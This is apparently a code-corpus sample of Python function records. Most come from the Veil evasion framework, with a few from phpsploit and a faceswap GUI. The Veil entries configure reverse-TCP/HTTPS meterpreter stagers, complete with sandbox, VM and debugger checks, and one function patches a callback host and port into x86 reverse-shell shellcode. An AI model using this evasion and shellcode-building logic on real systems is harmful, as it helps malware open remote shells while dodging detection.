{"docstring": "\"\"\"get a list of potential *usable-value lines. I.e. lines\nvalidated by self._validator().\n\nEmpty lines and comment lines (starting with '#') are ignored.\n\nIf `buffer` argument is None (default), *buffer-data (self.buffer)\nis used.\n\"\"\"\n", "func_signal": "def choices(self, buffer=None):\n", "code": "if buffer is None:\n    buffer = self.buffer\nif not isinstance(buffer, str):\n    raise ValueError(\"`buffer` must be a string\")\n# return a list of valid choices only\nresult = []\nfor line in buffer.splitlines():\n    line = line.strip()\n    if line and not line.startswith('#'):\n        try:\n            usable_value = self._validator(line)\n        except: # pylint: disable=bare-except\n            continue\n        result.append(usable_value)\nreturn result", "path": "phpsploit/src/linebuf.py", "commit_date": "2019-02-10 00:00:00", "repo_name": "nil0x42/phpsploit", "stars": 2103, "license": "gpl-3.0", "language": "python", "size": 3479}
{"docstring": "\"\"\" Analysis specific vars \"\"\"\n", "func_signal": "def set_vars(self):\n", "code": "selected_id = tk.StringVar()\nfilename = tk.StringVar()\nreturn {\"selected_id\": selected_id,\n        \"filename\": filename}", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Build the popup window \"\"\"\n", "func_signal": "def build(self):\n", "code": "optsframe, graphframe = self.layout_frames()\n\nself.opts_build(optsframe)\nself.compile_display_data()\nself.graph_build(graphframe)", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Add Treeview Title \"\"\"\n", "func_signal": "def add_label(self):\n", "code": "lbl = ttk.Label(self, text=\"Session Stats\", anchor=tk.CENTER)\nlbl.pack(side=tk.TOP, expand=True, fill=tk.X, padx=5, pady=5)", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Load previously saved sessions \"\"\"\n", "func_signal": "def reset_session(self):\n", "code": "self.clear_session()\nif self.session.stats[\"iterations\"] == 0:\n    print(\"Training not running\")\n    return\nloaded_data = self.session.historical.sessions\nmsg = \"Currently running training session\"\nself.set_session_summary(loaded_data, msg)\nself.vars[\"filename\"].set(\"Currently running training session\")", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Get the position of the next window \"\"\"\n", "func_signal": "def data_popup_get_position(self):\n", "code": "init_pos = [120, 120]\npos = init_pos\nwhile True:\n    if pos not in self.popup_positions:\n        self.popup_positions.append(pos)\n        break\n    pos = [item + 200 for item in pos]\n    init_pos, pos = self.data_popup_check_boundaries(init_pos, pos)\nreturn pos", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Load previously saved sessions \"\"\"\n", "func_signal": "def load_session(self):\n", "code": "self.clear_session()\nfilename = FileHandler(\"open\", \"session\").retfile\nif not filename:\n    return\nfilename = filename.name\nloaded_data = SavedSessions(filename).sessions\nmsg = filename\nif len(filename) > 70:\n    msg = \"...{}\".format(filename[-70:])\nself.set_session_summary(loaded_data, msg)\nself.vars[\"filename\"].set(filename)", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Build the graph in the top right paned window \"\"\"\n", "func_signal": "def graph_build(self, frame):\n", "code": "self.graph = SessionGraph(frame,\n                          self.display_data,\n                          self.vars[\"display\"].get(),\n                          self.vars[\"scale\"].get())\nself.graph.pack(expand=True, fill=tk.BOTH)\nself.graph.build()\nself.graph_initialised = True", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Options in options to the optsframe \"\"\"\n", "func_signal": "def opts_build(self, frame):\n", "code": "self.opts_combobox(frame)\nself.opts_checkbuttons(frame)\nself.opts_entry(frame)\nself.opts_buttons(frame)\nsep = ttk.Frame(frame, height=2, relief=tk.RIDGE)\nsep.pack(fill=tk.X, pady=(5, 0), side=tk.BOTTOM)", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Clear sessions stats \"\"\"\n", "func_signal": "def clear_session(self):\n", "code": "self.summary = None\nself.stats.loaded_data = None\nself.stats.tree_clear()\nself.reset_session_info()", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Reset the session info status to default \"\"\"\n", "func_signal": "def reset_session_info(self):\n", "code": "self.vars[\"filename\"].set(None)\nself.set_info(\"No session data loaded\")", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Set the helptext for option buttons \"\"\"\n", "func_signal": "def set_help(control):\n", "code": "hlp = \"\"\ncontrol = control.lower()\nif control == \"reset\":\n    hlp = \"Refresh graph\"\nelif control == \"save\":\n    hlp = \"Save display data to csv\"\nelif control == \"avgiterations\":\n    hlp = \"Number of data points to sample for rolling average\"\nelif control == \"outliers\":\n    hlp = \"Flatten data points that fall more than 1 standard \" \\\n          \"deviation from the mean to the mean value.\"\nelif control == \"avg\":\n    hlp = \"Display rolling average of the data\"\nelif control == \"raw\":\n    hlp = \"Display raw data\"\nelif control == \"trend\":\n    hlp = \"Display polynormal data trend\"\nelif control == \"display\":\n    hlp = \"Set the data to display\"\nelif control == \"scale\":\n    hlp = \"Change y-axis scale\"\nreturn hlp", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Build a treeview widget to hold the sessions stats \"\"\"\n", "func_signal": "def tree_configure(self, helptext):\n", "code": "self.tree.configure(yscrollcommand=self.scrollbar.set)\nself.tree.tag_configure(\"total\",\n                        background=\"black\",\n                        foreground=\"white\")\nself.tree.pack(side=tk.LEFT, expand=True, fill=tk.X)\nself.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)\nself.tree.bind(\"<ButtonRelease-1>\", self.select_item)\nTooltip(self.tree, text=helptext, wraplength=200)\nreturn self.tree_columns()", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Top level container frames \"\"\"\n", "func_signal": "def layout_frames(self):\n", "code": "leftframe = ttk.Frame(self)\nleftframe.pack(side=tk.LEFT, expand=False, fill=tk.BOTH, pady=5)\n\nsep = ttk.Frame(self, width=2, relief=tk.RIDGE)\nsep.pack(fill=tk.Y, side=tk.LEFT)\n\nrightframe = ttk.Frame(self)\nrightframe.pack(side=tk.RIGHT, fill=tk.BOTH, pady=5, expand=True)\n\nreturn leftframe, rightframe", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Set the correct list index based on the passed in session is \"\"\"\n", "func_signal": "def set_session_data(self, sessions, session_id):\n", "code": "if self.is_totals:\n    data = SessionsTotals(sessions).stats\nelse:\n    data = sessions[int(session_id) - 1]\nreturn data", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Add the option buttons \"\"\"\n", "func_signal": "def add_buttons(self):\n", "code": "for btntype in (\"reset\", \"clear\", \"save\", \"load\"):\n    cmd = getattr(self.parent, \"{}_session\".format(btntype))\n    btn = ttk.Button(self.optsframe,\n                     image=Images().icons[btntype],\n                     command=cmd)\n    btn.pack(padx=2, side=tk.RIGHT)\n    hlp = self.set_help(btntype)\n    Tooltip(btn, text=hlp, wraplength=200)", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Update the session summary info with\n    the selected item or launch graph \"\"\"\n", "func_signal": "def select_item(self, event):\n", "code": "region = self.tree.identify(\"region\", event.x, event.y)\nselection = self.tree.focus()\nvalues = self.tree.item(selection, \"values\")\nif values:\n    self.selected_id.set(values[0])\n    if region == \"tree\":\n        self.data_popup()", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Compile checkbox selections to list \"\"\"\n", "func_signal": "def selections_to_list(self):\n", "code": "selections = list()\nfor key, val in self.vars.items():\n    if (isinstance(val, tk.BooleanVar)\n            and key != \"outliers\"\n            and val.get()):\n        selections.append(key)\nreturn selections", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Set the data popup title \"\"\"\n", "func_signal": "def data_popup_title(self):\n", "code": "selected_id = self.selected_id.get()\ntitle = \"All Sessions\"\nif selected_id != \"Total\":\n    title = \"Session #{}\".format(selected_id)\nreturn \"{} - {}\".format(title, self.filename.get())", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Check that the popup remains within the screen boundaries \"\"\"\n", "func_signal": "def data_popup_check_boundaries(self, initial_position, position):\n", "code": "boundary_x = self.winfo_screenwidth() - 120\nboundary_y = self.winfo_screenheight() - 120\nif position[0] >= boundary_x or position[1] >= boundary_y:\n    initial_position = [initial_position[0] + 50, initial_position[1]]\n    position = initial_position\nreturn initial_position, position", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "\"\"\" Add the options combo boxes \"\"\"\n", "func_signal": "def opts_combobox(self, frame):\n", "code": "choices = {\"Display\": (\"Loss\", \"Rate\"),\n           \"Scale\": (\"Linear\", \"Log\")}\n\nfor item in [\"Display\", \"Scale\"]:\n    var = tk.StringVar()\n    cmd = self.optbtn_reset if item == \"Display\" else self.graph_scale\n    var.trace(\"w\", cmd)\n\n    cmbframe = ttk.Frame(frame)\n    cmbframe.pack(fill=tk.X, pady=5, padx=5, side=tk.TOP)\n    lblcmb = ttk.Label(cmbframe,\n                       text=\"{}:\".format(item),\n                       width=7,\n                       anchor=tk.W)\n    lblcmb.pack(padx=(0, 2), side=tk.LEFT)\n\n    cmb = ttk.Combobox(cmbframe, textvariable=var, width=10)\n    cmb[\"values\"] = choices[item]\n    cmb.current(0)\n    cmb.pack(fill=tk.X, side=tk.RIGHT)\n\n    self.vars[item.lower().strip()] = var\n\n    hlp = self.set_help(item)\n    Tooltip(cmbframe, text=hlp, wraplength=200)", "path": "FaceForensics/dataset/DeepFakes/faceswap-master/lib/gui/display_analysis.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "ondyari/FaceForensics", "stars": 2209, "license": "other", "language": "python", "size": 61245}
{"docstring": "'''Invokes payload generating function since nothing special is needed\nfor cli specifically'''\n", "func_signal": "def cli_gen_shellcode(self):\n", "code": "self.payload_gen()\nreturn", "path": "Veil/tools/ordnance/payloads/x86/bind_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.description = \"pure windows/meterpreter/reverse_tcp stager, no shellcode\"\nself.language = \"ruby\"\nself.extension = \"rb\"\nself.rating = \"Normal\"\nself.name = \"Pure Ruby Reverse TCP Stager\"\nself.path = \"ruby/meterpreter/rev_tcp\"\nself.cli_opts = cli_obj\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False\n\n# options we require user ineraction for- format is {Option : [Value, Description]]}\nself.required_options = {\n    \"LHOST\"          : [\"\", \"The listen target address\"],\n    \"LPORT\"          : [\"4444\", \"The listen port\"],\n    \"COMPILE_TO_EXE\" : [\"Y\", \"Compile to an executable\"],\n    \"INJECT_METHOD\"  : [\"Virtual\", \"Virtual, Void, or Heap\"],\n    \"HOSTNAME\"       : [\"X\", \"Optional: Only run on specified hostname\"],\n    \"DOMAIN\"         : [\"X\", \"Optional: Required internal domain\"],\n    \"USERNAME\"       : [\"X\", \"Optional: The required user account\"],\n    \"SLEEP\"          : [\"X\", \"Optional: Sleep \\\"Y\\\" seconds, check if accelerated\"]\n}", "path": "Veil/tools/evasion/payloads/ruby/meterpreter/rev_tcp.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.description = \"pure windows/meterpreter/reverse_https stager, no shellcode\"\nself.language = \"cs\"\nself.extension = \"cs\"\nself.rating = \"Excellent\"\nself.name = \"Pure C# Reverse HTTPS Stager\"\nself.path = \"cs/meterpreter/rev_https\"\nself.cli_opts = cli_obj\nself.payload_source_code = \"\"\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False\n\n# options we require user interaction for- format is {Option : [Value, Description]]}\nself.required_options = {\n                            \"LHOST\"            : [\"\", \"IP of the Metasploit handler\"],\n                            \"LPORT\"            : [\"8081\", \"Port of the Metasploit handler\"],\n                            \"COMPILE_TO_EXE\"   : [\"Y\", \"Compile to an executable\"],\n                            \"USE_ARYA\"         : [\"N\", \"Use the Arya crypter\"],\n                            \"INJECT_METHOD\"  : [\"Virtual\", \"Virtual or Heap\"],\n                            \"EXPIRE_PAYLOAD\" : [\"X\", \"Optional: Payloads expire after \\\"Y\\\" days\"],\n                            \"HOSTNAME\"       : [\"X\", \"Optional: Required system hostname\"],\n                            \"DOMAIN\"         : [\"X\", \"Optional: Required internal domain\"],\n                            \"PROCESSORS\"     : [\"X\", \"Optional: Minimum number of processors\"],\n                            \"USERNAME\"       : [\"X\", \"Optional: The required user account\"],\n                            \"TIMEZONE\"       : [\"X\", \"Optional: Check to validate not in UTC\"],\n                            \"DEBUGGER\"       : [\"X\", \"Optional: Check if debugger is attached\"],\n                            \"SLEEP\"          : [\"X\", \"Optional: Sleep \\\"Y\\\" seconds, check if accelerated\"],\n                            \"PROXY\"          : [\"N\", \"Use system proxy settings\"],\n                        }", "path": "Veil/tools/evasion/payloads/cs/meterpreter/rev_https.py", "commit_date": "2019-03-01 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.description = \"VirtualAlloc pattern for shellcode injection\"\nself.language = \"ruby\"\nself.extension = \"rb\"\nself.rating = \"Normal\"\nself.name = \"Ruby Flat Injection\"\nself.path = \"ruby/shellcode_inject/flat\"\nself.cli_opts = cli_obj\nself.shellcode = shellcode_help.Shellcode(cli_obj)\nself.payload_source_code = \"\"\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False\n\n# options we require user ineraction for- format is {Option : [Value, Description]]}\nself.required_options = {\n    \"COMPILE_TO_EXE\" : [\"Y\", \"Compile to an executable\"],\n    \"INJECT_METHOD\"  : [\"Virtual\", \"Virtual, Void, or Heap\"],\n    \"HOSTNAME\"       : [\"X\", \"Optional: Only run on specified hostname\"],\n    \"DOMAIN\"         : [\"X\", \"Optional: Required internal domain\"],\n    \"USERNAME\"       : [\"X\", \"Optional: The required user account\"],\n    #\"MINRAM\"         : [\"X\", \"Optional: Minimum amount of ram on target\"],\n    #\"USERPROMPT\"     : [\"X\", \"Optional: Prompt user prior to execution\"],\n    #\"DISKSIZE\"       : [\"X\", \"Optional: Set minimum disk size\"],\n    \"SLEEP\"          : [\"X\", \"Optional: Sleep \\\"Y\\\" seconds, check if accelerated\"]\n}", "path": "Veil/tools/evasion/payloads/ruby/shellcode_inject/flat.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.description = \"Auxiliary script which converts Veil's powershell batch script to macro code\"\nself.language = \"powershell\"\nself.rating = \"Normal\"\nself.extension = \"txt\"\nself.name = \"Macro Converter\"\nself.path = \"auxuliary/macro_converter\"\nself.cli_opts = cli_obj\nself.payload_source_code = \"\"\n\nself.required_options = {\n    \"POSH_BATCH\": [\"\", \"Path to a powershell batch script\"],\n    \"ARCHITECTURE\": [\"x86\", \"x86 or x64\"]\n    }", "path": "Veil/tools/evasion/payloads/auxiliary/macro_converter.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Prints payload stats'''\n", "func_signal": "def payload_stats(self):\n", "code": "print(\" [*] Payload Name: \" + helpers.color(self.name))\nprint(\" [*] IP Address: \" + helpers.color(self.required_options['LHOST'][0]))\nprint(\" [*] Port: \" + helpers.color(str(self.required_options['LPORT'][0])))\nprint(\" [*] Shellcode Size: \" + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\\n'))\nprint(self.customized_shellcode)\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Invokes payload generating function since nothing special is needed\nfor cli specifically'''\n", "func_signal": "def cli_gen_shellcode(self):\n", "code": "self.payload_gen()\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# Take the passed in attributes and gen shellcode\n", "func_signal": "def payload_gen(self):\n", "code": "ip_shellcode = \"\"\nn = 2\nip_shellcode_stage = binascii.hexlify(self.required_options[\"LHOST\"][0].encode())\nip_shellcode_stage = [ip_shellcode_stage[i:i+n] for i in range(0, len(ip_shellcode_stage), n)]\nfor two_bytes in ip_shellcode_stage:\n    ip_shellcode += '\\\\x' + two_bytes.decode('UTF-8')\n\n# convert port to shellcode\nport_shellcode_stage = str(hex(int(self.required_options['LPORT'][0])).lstrip('0'))\nif len(port_shellcode_stage.lstrip('x')) == 3:\n    # detect if odd number, is so, need to add a '0' to the front\n    port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')\n    port_1half = '\\\\x' + port_1half\n    port_2half = port_shellcode_stage[2:4]\n    port_2half = '\\\\x' + port_2half\n    port_shellcode = port_1half + port_2half\nelif len(port_shellcode_stage.lstrip('x')) == 4:\n    port_1half = port_shellcode_stage[1:3]\n    port_1half = '\\\\x' + port_1half\n    port_2half = port_shellcode_stage[3:5]\n    port_2half = '\\\\x' + port_2half\n    port_shellcode = port_1half + port_2half\nelif len(port_shellcode_stage.lstrip('x')) == 2:\n    port_1half = port_shellcode_stage[1:3].lstrip('x')\n    port_1half = '\\\\x' + port_1half\n    port_2half = '00'\n    port_2half = '\\\\x' + port_2half\n    port_shellcode = port_2half + port_1half\nelif len(port_shellcode_stage.lstrip('x')) == 1:\n    port_1half = port_shellcode_stage.lstrip('x')\n    port_1half = '\\\\x0' + port_1half\n    port_2half = '\\\\x00'\n    port_shellcode = port_2half + port_1half\n\nretries = '\\\\x09'\n\nstager_shellcode = codecs.encode(self.stager[0:self.retries_offset], 'hex')\nstager_shellcode = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode), 2))\nstager_shellcode += retries\n\nstager_shellcode2 = codecs.encode(self.stager[self.retries_offset + 1:self.lport_offset], 'hex')\nstager_shellcode2 = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode2[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode2), 2))\nstager_shellcode2 += port_shellcode\n\nstager_shellcode3 = codecs.encode(self.stager[self.lport_offset + 2:self.lhost_offset], 'hex')\nstager_shellcode3 = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_shellcode3[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode3), 2))\nstager_shellcode3 += ip_shellcode\nstager_shellcode3 += \"\\\\x00\"\n\nstager_p2 = codecs.encode(self.stager[self.lhost_offset + len(self.required_options[\"LHOST\"][0]) + 1:], 'hex')\nstager_p2 = \"\\\\x\" + '\\\\x'.join(codecs.decode(stager_p2[i:i + 2], 'utf-8') for i in range(0, len(stager_p2), 2))\n\nself.customized_shellcode = stager_shellcode + stager_shellcode2 + stager_shellcode3 + stager_p2\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp_dns.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "\"\"\"\nPrint the framework title, with version.\n\"\"\"\n", "func_signal": "def title_screen():\n", "code": "if settings.TERMINAL_CLEAR != \"false\":\n    os.system('clear')\n\nprint('=' * 79)\nprint(' ' * 29 + helpers.color('Veil', status=False, bold=True) + ' | [Version]: ' + veil_version)\nprint('=' * 79)\nprint('      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework')\nprint('=' * 79 + '\\n')\nreturn", "path": "Veil/lib/common/messages.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.description = \"pure windows/meterpreter/reverse_https stager, no shellcode\"\nself.language = \"go\"\nself.extension = \"go\"\nself.rating = \"Normal\"\nself.name = \"Pure Golang Reverse HTTPS Stager\"\nself.path = \"go/meterpreter/rev_https\"\nself.cli_opts = cli_obj\nself.payload_source_code = \"\"\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False\n\n# options we require user ineraction for- format is {Option : [Value, Description]]}\nself.required_options = {\n    \"LHOST\"          : [\"\", \"IP of the Metasploit handler\"],\n    \"LPORT\"          : [\"80\", \"Port of the Metasploit handler\"],\n    \"COMPILE_TO_EXE\" : [\"Y\", \"Compile to an executable\"],\n    \"INJECT_METHOD\"  : [\"Virtual\", \"Virtual or Heap\"],\n    \"HOSTNAME\"       : [\"X\", \"Optional: Required system hostname\"],\n    \"PROCESSORS\"     : [\"X\", \"Optional: Minimum number of processors\"],\n    \"USERNAME\"       : [\"X\", \"Optional: The required user account\"],\n    \"UTCCHECK\"       : [\"FALSE\", \"Check if system uses UTC time\"],\n    \"USERPROMPT\"     : [\"FALSE\", \"Prompt user prior to injection\"],\n    \"RAMCHECK\"       : [\"FALSE\", \"Check for at least 3 gigs of RAM\"],\n    \"PROCCHECK\"      : [\"FALSE\", \"Check for active VM processes\"],\n    \"MINPROCS\"       : [\"X\", \"Minimum number of running processes\"],\n    \"BADMACS\"        : [\"FALSE\", \"Check for VM based MAC addresses\"],\n    \"CLICKTRACK\"     : [\"X\", \"Require X number of clicks before execution\"],\n    \"CURSORCHECK\"    : [\"FALSE\", \"Check for mouse movements\"],\n    \"DISKSIZE\"       : [\"X\", \"Check for a minimum number of gigs for hard disk\"],\n    \"SLEEP\"          : [\"X\", \"Optional: Sleep \\\"Y\\\" seconds, check if accelerated\"]\n}", "path": "Veil/tools/evasion/payloads/go/meterpreter/rev_https.py", "commit_date": "2018-05-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.language = \"cs\"\nself.extension = \"cs\"\nself.rating = \"Poor\"\nself.description = \"C# VirtualAlloc method for inline shellcode injection\"\nself.name = \"C# Flat Shellcode Injector\"\nself.path = \"cs/shellcode_inject/base64\"\nself.shellcode = shellcode_help.Shellcode(cli_obj)\nself.cli_opts = cli_obj\nself.payload_source_code = \"\"\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False\n\n# options we require user ineraction for- format is {OPTION : [Value, Description]]}\nself.required_options = {\n                            \"COMPILE_TO_EXE\" : [\"Y\", \"Compile to an executable\"],\n                            \"USE_ARYA\"       : [\"N\", \"Use the Arya crypter\"],\n                            \"INJECT_METHOD\"  : [\"Virtual\", \"Virtual or Heap\"],\n                            \"EXPIRE_PAYLOAD\" : [\"X\", \"Optional: Payloads expire after \\\"Y\\\" days\"],\n                            \"HOSTNAME\"       : [\"X\", \"Optional: Required system hostname\"],\n                            \"DOMAIN\"         : [\"X\", \"Optional: Required internal domain\"],\n                            \"PROCESSORS\"     : [\"X\", \"Optional: Minimum number of processors\"],\n                            \"USERNAME\"       : [\"X\", \"Optional: The required user account\"],\n                            \"TIMEZONE\"       : [\"X\", \"Optional: Check to validate not in UTC\"],\n                            \"DEBUGGER\"       : [\"X\", \"Optional: Check if debugger is attached\"],\n                            \"SLEEP\"          : [\"X\", \"Optional: Sleep \\\"Y\\\" seconds, check if accelerated\"]\n                        }", "path": "Veil/tools/evasion/payloads/cs/shellcode_inject/base64.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "'''Invokes payload generating function since nothing special is needed\nfor cli specifically'''\n", "func_signal": "def cli_gen_shellcode(self):\n", "code": "self.payload_gen()\nreturn", "path": "Veil/tools/ordnance/payloads/x86/rev_tcp_dns.py", "commit_date": "2018-04-17 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
{"docstring": "# required options\n", "func_signal": "def __init__(self, cli_obj):\n", "code": "self.shortname = \"Inline\"\nself.description = \"VirtualAlloc pattern for shellcode injection\"\nself.language = \"autoit\"\nself.rating = \"Normal\"\nself.extension = \"au3\"\nself.name = \"AutoIt Flat Shellcode Injector\"\nself.path = \"autoit/shellcode_inject/flat\"\nself.cli_opts = cli_obj\nself.shellcode = shellcode_help.Shellcode(cli_obj)\nself.payload_source_code = \"\"\nif cli_obj.ordnance_payload is not None:\n    self.payload_type = cli_obj.ordnance_payload\nelif cli_obj.msfvenom is not None:\n    self.payload_type = cli_obj.msfvenom\nelif not cli_obj.tool:\n    self.payload_type = \"\"\nself.cli_shellcode = False\n\nself.required_options = {\n    \"COMPILE_TO_EXE\" : [\"Y\", \"Compile to an executable\"]\n}", "path": "Veil/tools/evasion/payloads/autoit/shellcode_inject/flat.py", "commit_date": "2018-04-12 00:00:00", "repo_name": "Veil-Framework/Veil", "stars": 3863, "license": "gpl-3.0", "language": "python", "size": 756}
